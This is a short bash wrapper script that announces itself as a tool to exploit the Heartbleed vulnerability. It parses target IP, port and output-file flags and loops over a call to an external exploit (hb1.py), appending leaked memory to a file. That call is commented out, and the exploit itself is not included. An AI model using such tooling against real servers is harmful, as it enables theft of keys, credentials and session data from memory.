#!/bin/bash

#Welcome message
echo "<h2>Welcome to HeartBleed script<h2>"
echo "Used to exploit the HeartBleed vulnerability use -h or --help for correct use of flags"


#localvariables
ip=
port=8443
file=exploits.bin
i=10 #amount heartbeat request to send

#Iterative script to run Heartbleed vulnerability script hb1.py
function main
{
	ctr=1

	while [ $ctr -lt $i ]
	do
		echo $ctr
		echo $ip $port $file $i
		#python hb1.py $ip -p $port >> $file
		ctr=$((ctr+1))
	done
	echo All done
}

function print_help
{
	echo ""
	echo "Help"
	echo "-------------------------------"
	echo "-ip for ip address (mandatory)"
	echo "-p for port nunmber"
	echo "-f for file name"
	echo "-i number of heartbeat requests"
	echo ""
}

#Reading flags
while  [ "$1" != "" ]; do
	case $1 in
		-ip )		
						ip=$2
						shift
			;;
		-p 	)	
						port=$2
						shift
			;;
		-f	)			
						file=$2
						shift
			;;
		-i 	)			
						i=$2
						shift
			;;				
		-h | --help)	print_help
						exit 0
			;;
	esac
	shift			

done

if [  -n "$ip"  ]
then
	main
fi



